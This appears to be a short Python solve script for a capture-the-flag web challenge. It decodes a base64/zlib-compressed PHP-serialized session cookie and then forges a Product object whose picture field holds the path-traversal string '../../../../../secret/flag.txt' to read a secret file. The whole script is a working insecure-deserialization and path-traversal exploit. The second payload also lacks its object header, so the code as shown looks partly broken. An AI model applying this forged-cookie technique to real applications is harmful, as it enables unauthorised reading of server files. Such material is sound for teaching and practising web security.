import base64
import zlib
import IPython
import requests
state="eJxNj02OwyAMRnMWDlDFGELibHqDLnqAyAEjIU1/FLJqlbsPMFOpCy++p+9Z9oUsqevOuyjS9M4EhlTXQJcl5/S4q/lCrpT+E2GrQa39oS4FNWcaihk8eLaAZhxcCGadsCQbBFDihFFcdHYYPIpEietqJoujZjPGKboVva97AL9W3/kmH/hKj+UpGy+67/sKtf5qyo3Tz8IhbAU0BZpyrsop7Wo+Pme37zxvhTEBvRPBXOc4fgGlmVFw"
a = base64.b64decode(state)

b = zlib.decompress(a)

print(b)## this is the state, so we can put anything inside

c=b'O:5:"State":2:{s:14:"\x00State\x00session";O:7:"Session":3:{s:11:"\x00Session\x00id";s:64:"ba1f8a6204a3e350ec43150de9b85c9ed5407cb3d0e733fa290227510cf6e873";s:13:"\x00Session\x00name";s:12:"wooooooooooo";s:22:"\x00Session\x00email_address";s:15:"wooooo@gmail.it";}s:11:"\x00State\x00cart";a:1:{i:2;i:1;}}'

c=b'{s:11:"\x00Product\x00id";i:2;s:13:"\x00Product\x00name";s:6:"ciccio";s:20:"\x00Product\x00description";s:6:"ciccio";s:16:"\x00Product\x00picture";s:30:"../../../../../secret/flag.txt";s:14:"\x00Product\x00price";i:20;}'

c= zlib.compress(c)

c= base64.b64encode(c)

print(c)
